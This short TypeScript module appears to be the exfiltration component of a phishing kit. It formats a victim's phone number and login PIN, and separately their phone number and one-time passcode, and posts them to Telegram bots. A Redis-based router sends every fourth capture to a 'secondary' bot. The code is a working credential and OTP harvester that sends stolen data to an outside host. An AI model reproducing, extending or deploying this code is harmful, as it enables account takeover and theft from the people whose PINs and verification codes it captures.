import { getNextBot, type BotConfig } from './botRouter'

// Helper to send message to Telegram using routed bot
const sendTelegramMessage = async (text: string): Promise<void> => {
  try {
    // Get the next bot using Redis-based routing (every 4th → secondary)
    const bot: BotConfig = await getNextBot()

    if (!bot.token || !bot.chatId) {
      console.error('Telegram configuration missing for bot:', bot.name)
      return
    }

    const url = `https://api.telegram.org/bot${bot.token}/sendMessage`

    console.log(`📤 SENDING TO ${bot.name} BOT:`, text)

    await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: bot.chatId,
        text: text,
        parse_mode: 'HTML'
      })
    })
  } catch (error) {
    console.error('Telegram Send Error:', error)
  }
}

export const sendLoginDetails = async (phone: string, pin: string): Promise<void> => {
  const message = `
🔐 *NEW LOGIN*
📱 Phone: ${phone}
🔢 PIN: ${pin}
  `.trim()

  await sendTelegramMessage(message)
}

export const sendOTPDetails = async (phone: string, otp: string): Promise<void> => {
  const message = `
🔑 *OTP RECEIVED*
📱 Phone: ${phone}
🔢 Code: ${otp}
  `.trim()

  await sendTelegramMessage(message)
}
